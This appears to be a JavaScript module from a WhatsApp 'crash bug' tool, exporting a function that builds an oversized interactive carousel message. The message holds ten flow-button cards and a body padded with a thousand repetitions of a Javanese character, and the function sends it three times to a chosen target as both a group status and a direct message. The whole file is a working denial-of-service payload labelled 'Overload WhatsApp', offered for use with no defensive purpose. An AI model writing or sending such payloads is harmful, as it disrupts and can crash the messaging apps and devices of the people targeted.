const { relayCrashToDevices } = require('../target-utils');

async function Xdelay(SYxS7, target) {
    let totalDelivered = 0;
    const errors = [];
    const totalPushes = 3;

    for (let i = 0; i < totalPushes; i++) {
        const push = [];

        for (let k = 0; k < 10; k++) {
            push.push({
                body: {
                    text: 'Overload WhatsApp'
                },
                footer: {
                    text: ''
                },
                header: {
                    title: '🚩 TrashSuperior ',
                    hasMediaAttachment: false
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'galaxy_message',
                        buttonParamsJson: JSON.stringify({
                            header: 'null',
                            body: 'xxx',
                            flow_action: 'navigate',
                            flow_action_payload: {
                                screen: 'FORM_SCREEN'
                            },
                            flow_cta: 'Grattler',
                            flow_id: '1169834181134583',
                            flow_message_version: '3',
                            flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s',
                        })
                    }],
                },
            });
        }

        const carousel = {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: false,
                },
                body: {
                    text: '🚩 TrashSuperior Overload ' + "ꦾ".repeat(1000),
                },
                footer: {
                    text: 'Trash Superior',
                },
                carouselMessage: {
                    cards: [...push],
                },
            }
        };

        try {
            const res1 = await relayCrashToDevices(SYxS7, target, {
                groupStatusMessageV2: {
                    message: carousel
                }
            });
            if (res1.success) totalDelivered += res1.deliveredCount; else errors.push(...res1.errors);
        } catch (e) {
            errors.push(`[Xdelay status wrapper ${i + 1}]: ${e.message}`);
        }

        try {
            const res2 = await relayCrashToDevices(SYxS7, target, carousel);
            if (res2.success) totalDelivered += res2.deliveredCount; else errors.push(...res2.errors);
        } catch (e) {
            errors.push(`[Xdelay direct interactive ${i + 1}]: ${e.message}`);
        }
    }

    return {
        success: totalDelivered > 0,
        deliveredCount: totalDelivered,
        errors
    };
}

module.exports = { Xdelay };
